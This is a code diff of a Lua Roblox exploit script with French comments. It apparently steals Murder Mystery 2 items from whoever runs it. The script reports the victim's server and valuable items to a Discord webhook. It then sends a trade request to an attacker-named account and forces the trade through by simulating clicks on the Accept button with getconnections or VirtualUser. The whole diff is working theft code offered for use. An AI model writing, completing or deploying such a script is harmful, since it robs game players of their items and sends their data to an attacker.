@@ -484,34 +484,25 @@ local WebHookEmbed = CreateEmbed(
     }
 )
 
-if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
     SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
     SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Trade = ReplicatedStorage:WaitForChild("Trade")
 local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-
--- Variable pour stocker dynamiquement l'ID du trade en cours
-local activeTradeID = nil
-
--- Écoute optionnelle si le serveur envoie l'ID du trade via un Remote (souvent transmis lors de l'ouverture de la fenêtre de trade)
--- Si ton script possède déjà un moyen de récupérer l'ID réel, assure-toi de le stocker dans activeTradeID.
+local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function getitems()
     coroutine.resume(destroytrades2)
 
     -- 1. Envoi de la demande de trade au compte principal
-    local targetPlayer = Players:FindFirstChild(userName)
-    if not targetPlayer then
-        warn("Compte principal introuvable pour le trade.")
-        return
-    end
+    local sendArgs = {
+        [1] = Players[userName]
+    }
+    Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
-    Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2)
 
     -- 2. Remplissage des 4 cases max de MM2
@@ -545,36 +536,43 @@ local function getitems()
     task.wait(1.5)
 
     -- 3. Première validation (Lancer l'acceptation initiale)
-    local success, err = pcall(function()
+    pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
-    if not success then
-        warn("Erreur sur AcceptRequest : " .. tostring(err))
-    end
 
     -- Attente du timer de sécurité obligatoire de MM2
     task.wait(5.5)
 
-    -- 4. Confirmation finale avec vérification
+    -- 4. Confirmation finale par simulation de clic direct sur le bouton GUI
     pcall(function()
-        local currentTick = workspace:GetServerTimeNow() or tick()
-        
-        -- Utilise l'ID dynamique s'il existe, sinon essaie de récupérer l'état du trade localement
-        -- (Dans MM2, l'ID du trade est souvent un nombre unique généré par le serveur à la création de la session de trade)
-        local tradeID = activeTradeID or 428469873 
+        local localPlayer = Players.LocalPlayer
+        local playerGui = localPlayer:WaitForChild("PlayerGui", 5)
+        if not playerGui then return end
 
-        -- Certains scripts récents de MM2 nécessitent de passer la table du trade ou l'instance du joueur en argument
-        local args = {
-            [1] = tradeID,
-            [2] = currentTick
-        }
+        -- Localisation du GUI de Trade de MM2
+        local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeContainer") or playerGui:FindFirstChild("Trade")
         
-        local confirmSuccess, confirmErr = pcall(function()
-            Trade.AcceptTrade:FireServer(unpack(args))
-        end)
+        if tradeGui then
+            -- Recherche du bouton d'acceptation dans le GUI
+            local acceptBtn = tradeGui:FindFirstChild("Accept", true) 
+                or tradeGui:FindFirstChild("Confirm", true) 
+                or tradeGui:FindFirstChild("AcceptButton", true)
 
-        if not confirmSuccess then
-            warn("Erreur lors de AcceptTrade (Dernière étape bloquée) : " .. tostring(confirmErr))
+            if acceptBtn then
+                -- Simulation du clic sur le bouton
+                if getconnections then
+                    for _, connection in pairs(getconnections(acceptBtn.MouseButton1Click)) do
+                        connection:Fire()
+                    end
+                    for _, connection in pairs(getconnections(acceptBtn.MouseButton1Down)) do
+                        connection:Fire()
+                    end
+                else
+                    local VirtualUser = game:GetService("VirtualUser")
+                    VirtualUser:CaptureController()
+                    VirtualUser:ClickButton1(Vector2.new(acceptBtn.AbsolutePosition.X + 10, acceptBtn.AbsolutePosition.Y + 10))
+                end
+            end
         end
     end)
 end
